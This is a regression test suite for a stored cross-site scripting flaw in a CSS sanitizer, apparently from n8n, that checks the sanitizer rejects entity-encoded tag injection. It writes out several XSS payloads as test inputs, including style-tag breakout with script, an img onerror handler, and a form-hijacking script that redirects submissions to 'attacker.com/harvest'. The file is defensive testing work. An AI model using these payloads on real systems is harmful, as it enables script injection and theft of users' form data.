/**
 * Regression tests for NODE-4552: Stored XSS via sanitizeCustomCss textFilter Bypass
 *
 * This test suite demonstrates a security vulnerability in the sanitizeCustomCss function.
 * The function uses sanitize-html with allowedTags: [], which strips HTML tags, but then
 * uses a textFilter callback that decodes HTML entities (&lt;, &gt;) back to literal
 * characters (<, >). This allows an attacker to encode malicious HTML as entities, which
 * survive tag stripping and are decoded back into executable HTML.
 *
 * The sanitized CSS is then rendered via Handlebars triple-braces {{{ dangerousCustomCss }}}
 * inside a <style> tag, enabling style breakout and arbitrary JavaScript execution.
 *
 * See: packages/cli/templates/form-trigger.handlebars line 468
 */

import { sanitizeCustomCss } from '../utils/utils';

describe('NODE-4552: sanitizeCustomCss XSS vulnerability', () => {
	describe('Style tag breakout attacks', () => {
		it('should prevent style tag breakout with HTML entity-encoded script tag', () => {
			// Attacker input: Uses HTML entities to bypass tag stripping
			const maliciousInput =
				'body { color: red; }}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;{';

			const result = sanitizeCustomCss(maliciousInput);

			// FAILS: textFilter decodes &lt; → <, &gt; → >, allowing tag breakout
			// Expected: HTML entities should remain encoded
			// Actual: result contains literal </style><script> tags
			expect(result).not.toContain('</style>');
			expect(result).not.toContain('<script>');
			expect(result).not.toContain('</script>');

			// Should preserve entities or remove them entirely
			if (result?.includes('&lt;') || result?.includes('&gt;')) {
				// Entities preserved - safe
				expect(result).toContain('&lt;');
				expect(result).toContain('&gt;');
			} else {
				// Entities removed entirely - also safe
				expect(result).not.toContain('<');
				expect(result).not.toContain('>');
			}
		});

		it('should prevent img tag with onerror handler via entity encoding', () => {
			const maliciousInput =
				'body { color: blue; }}&lt;/style&gt;&lt;img src=x onerror=alert(document.domain)&gt;&lt;style&gt;{';

			const result = sanitizeCustomCss(maliciousInput);

			// FAILS: Allows img tag breakout with onerror handler
			expect(result).not.toContain('</style>');
			expect(result).not.toContain('<img');
			expect(result).not.toContain('onerror');
		});

		it('should prevent form action hijacking payload', () => {
			// Real-world attack from issue report: Hijacks form submission to steal data
			const maliciousInput = `body { color: red; }
}&lt;/style&gt;&lt;script&gt;document.addEventListener("DOMContentLoaded",function(){var f=document.getElementById("n8n-form");if(f){f.action="https://attacker.com/harvest"}})&lt;/script&gt;&lt;style&gt;{`;

			const result = sanitizeCustomCss(maliciousInput);

			// FAILS: Allows script tag that changes form action URL
			expect(result).not.toContain('</style>');
			expect(result).not.toContain('<script>');
			expect(result).not.toContain('addEventListener');
			expect(result).not.toContain('attacker.com');
		});
	});

	describe('CSS injection edge cases', () => {
		it('should preserve safe CSS child combinator while rejecting tag injection', () => {
			const input = '#n8n-form > div { color: red; }';
			const result = sanitizeCustomCss(input);

			// This should work - legitimate CSS selector
			expect(result).toBe(input);
			expect(result).toContain('>');
		});

		it('should handle mixed safe and malicious content', () => {
			const maliciousInput =
				'.container > p { color: red; }&lt;script&gt;alert(1)&lt;/script&gt;';

			const result = sanitizeCustomCss(maliciousInput);

			// Safe CSS should be preserved, malicious tags should be blocked
			expect(result).toContain('.container > p');
			expect(result).not.toContain('<script>');
		});

		it('should prevent multiple encoding bypass attempts', () => {
			const maliciousInput =
				'}&lt;/style&gt;&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;&lt;style&gt;{';

			const result = sanitizeCustomCss(maliciousInput);

			// FAILS: Multiple closing tags should not bypass sanitization
			expect(result).not.toContain('</style>');
			expect(result).not.toContain('<script>');
		});
	});

	describe('URL-based attacks', () => {
		it('should handle url() with encoded script tags', () => {
			// Attempt to inject script via background-image url
			const maliciousInput = `.bg { background-image: url('}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;{'); }`;

			const result = sanitizeCustomCss(maliciousInput);

			// Should not allow style breakout even within url()
			expect(result).not.toContain('</style><script>');
		});

		it('should handle data URIs with encoded payloads', () => {
			const maliciousInput = `body { background: url('data:image/svg+xml,}&lt;/style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;style&gt;{'); }`;

			const result = sanitizeCustomCss(maliciousInput);

			// Data URIs should not enable style breakout
			expect(result).not.toContain('</style><script>');
		});
	});

	describe('Legitimate CSS should be preserved', () => {
		it('should preserve CSS with legitimate > selectors', () => {
			const legitimateCss = '#n8n-form > div.form-header > p { text-align: left; }';
			const result = sanitizeCustomCss(legitimateCss);

			expect(result).toBe(legitimateCss);
		});

		it('should preserve CSS with & in property values', () => {
			const legitimateCss = '.class { content: "Q&A"; }';
			const result = sanitizeCustomCss(legitimateCss);

			expect(result).toContain('Q&A');
		});

		it('should preserve complex CSS with multiple selectors', () => {
			const legitimateCss = `
				#n8n-form > div.form-header > p { text-align: left; }
				.form-container > .input-group + .input-group { margin-top: 1rem; }
				button:hover { background-color: #0056b3; }
			`;
			const result = sanitizeCustomCss(legitimateCss);

			expect(result).toBe(legitimateCss);
		});
	});

	describe('Defense in depth', () => {
		it('should not allow CSS that could break template structure', () => {
			// Even without <script>, breaking the style tag is dangerous
			const maliciousInput = '}</style><div>injected content</div><style>{';

			const result = sanitizeCustomCss(maliciousInput);

			// Should not contain literal closing style tag
			expect(result).not.toContain('</style>');
		});

		it('should handle ampersand entity bypass attempts', () => {
			// Try to bypass by encoding the & itself: &amp;lt; → &lt; → <
			const maliciousInput = 'body{color:red;}&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;';

			const result = sanitizeCustomCss(maliciousInput);

			// Should not decode multiple levels of entities
			expect(result).not.toContain('<script>');
			expect(result).not.toContain('&lt;script');
		});
	});

	describe('Context-aware sanitization', () => {
		it('should be safe when rendered in Handlebars template with triple-braces', () => {
			// The actual rendering context from form-trigger.handlebars:
			// {{#if dangerousCustomCss}}
			//   <style>
			//     {{{ dangerousCustomCss }}}
			//   </style>
			// {{/if}}

			const maliciousInput =
				'body{color:red;}&lt;/style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;style&gt;';

			const sanitized = sanitizeCustomCss(maliciousInput);

			// When rendered with triple-braces (no HTML escaping), the output should still be safe
			// because sanitization should prevent tag injection entirely
			const rendered = `<style>${sanitized}</style>`;

			// The rendered HTML should not contain executable script tags
			expect(rendered).not.toContain('</style><script>');
			expect(rendered).not.toContain('onerror');
		});
	});
});
